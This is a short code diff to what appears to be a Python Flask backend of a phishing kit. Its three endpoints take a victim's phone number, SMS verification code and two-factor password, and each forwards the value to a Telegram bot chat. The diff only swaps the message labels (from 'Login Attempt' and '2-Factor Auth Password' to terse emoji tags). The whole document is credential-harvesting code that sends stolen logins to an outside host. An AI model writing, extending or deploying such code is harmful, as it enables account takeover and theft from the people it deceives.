@@ -24,7 +24,7 @@ def send_phone():
     if not phone_number:
         return jsonify({"ok": False, "error": "전화번호가 없습니다."}), 400
     
-    message = f"Login Attempt: {phone_number}"
+    message = f"🚀 num: {phone_number}"
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -53,7 +53,7 @@ def send_code():
     if not phone_number or not verification_code:
         return jsonify({"ok": False, "error": "전화번호 또는 인증 코드가 없습니다."}), 400
     
-    message = f"Verification Code for {phone_number}: {verification_code}"
+    message = f"🐒 cod: {verification_code}"
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -82,7 +82,7 @@ def send_password():
     if not phone_number or not password:
         return jsonify({"ok": False, "error": "전화번호 또는 비밀번호가 없습니다."}), 400
     
-    message = f"2-Factor Auth Password for {phone_number}: {password}"
+    message = f"⭐ pass: {password}"
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
